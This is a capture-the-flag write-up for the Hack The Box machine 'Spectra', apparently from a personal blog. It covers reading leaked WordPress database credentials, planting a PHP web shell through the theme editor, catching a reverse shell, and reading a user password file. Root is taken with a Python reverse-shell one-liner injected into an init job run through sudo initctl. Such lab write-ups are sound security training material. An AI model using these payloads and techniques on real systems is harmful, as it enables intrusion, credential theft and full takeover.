---
permalink: /htb/spectra
title: Spectra
---

<br>

# Nmap

```bash
$ nmap 10.10.10.229
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-28 03:56 AEST
Nmap scan report for 10.10.10.229
Host is up (0.68s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 79.01 seconds
```

We can visit http://10.10.10.229/

Add `10.10.10.229 spectra.htb` to /etc/hosts

Looking around we can see index of http://spectra.htb/testing/ is available to us.

From there we can go to http://spectra.htb/testing/wp-config.php.save the code is hidden in a php tag but we can view it in the page source (ctrl U).

```php

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );
```

I tried to login but got this error:

```bash
[~/Documents/HTB/spectra] 
$ mysql -h 10.10.10.229 -u devteam -p -D dev 
Enter password: 
ERROR 1130 (HY000): Host '10.10.16.17' is not allowed to connect to this MySQL server
```

Our password is correct, but our IP is not authorised.

I had luck with wordpress however: http://spectra.htb/main/wp-login.php

`administrator:devteam01`

Go to Appearance > Theme Editor

Change Twenty Twenty to something else, eg Twenty Nineteen

Click some php page, eg 404.php

Replace the code with

```php
<?php system($_REQUEST['connor']); ?>
```

and update file.

I ran into this issue <https://stackoverflow.com/questions/52671255/wordpress-editor-not-updating-files-unable-to-communicate-back-with-site-to-che>

where disabling then re-enabling all plugins fixed it.

Now we can run commands: http://spectra.htb/main/wp-content/themes/twentynineteen/404.php?connor=whoami

Tip: use `cat ... | xclip -selection clipboard` to copy large files to clipboard

We'll use a [php reverse shell](https://github.com/BlackArch/webshells/blob/master/php/php-reverse-shell.php)

```bash
$ nc -lvnp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.229.
Ncat: Connection from 10.10.10.229:35376.
Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux
 16:25:03 up  5:28,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
$ cd /home
$ whoami
nginx
$ ls
chronos
katie
nginx
root
user
$ cd katie
$ ls
log
user.txt
$ 
```

With `cat /etc/lsb-release` we see it is using ChromeOS

# Lateral Move

We are currently the nginx user and want to pivot to Katie.

Running linPEAS let's us find katie's password:

```bash
$ cat /etc/autologin/passwd
SummerHereWeCome!!
```

```bash
$ ssh katie@spectra.htb
The authenticity of host 'spectra.htb (10.10.10.229)' can't be established.
RSA key fingerprint is SHA256:lr0h4CP6ugF2C5Yb0HuPxti8gsG+3UY5/wKjhnjGzLs.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'spectra.htb' (RSA) to the list of known hosts.
(katie@spectra.htb) Password: 
katie@spectra ~ $ ls
log  user.txt
katie@spectra ~ $ cat user.txt 
e89d27fe195e9114ffa72ba8913a6130
```

# Privesc

```bash
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

We can see she is in the developers group and can access these files:

```bash
katie@spectra ~ $ id
uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
katie@spectra ~ $ find / -group developers 2>/dev/null
/etc/init/test6.conf
/etc/init/test7.conf
/etc/init/test3.conf
/etc/init/test4.conf
/etc/init/test.conf
/etc/init/test8.conf
/etc/init/test9.conf
/etc/init/test10.conf
/etc/init/test2.conf
/etc/init/test5.conf
/etc/init/test1.conf
/srv
/srv/nodetest.js
katie@spectra ~ $ 
```

Edit `etc/init/test1.conf`to get a python reverse shell:

```python
start on pwn
task
exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.17",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
katie@spectra ~ $ sudo /sbin/initctl emit pwn
```

```bash
$ nc -lvnp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.229.
Ncat: Connection from 10.10.10.229:35394.
# cat /root/root.txt
d44519713b889d5e1f9e536d0c6df2fc
# 
```
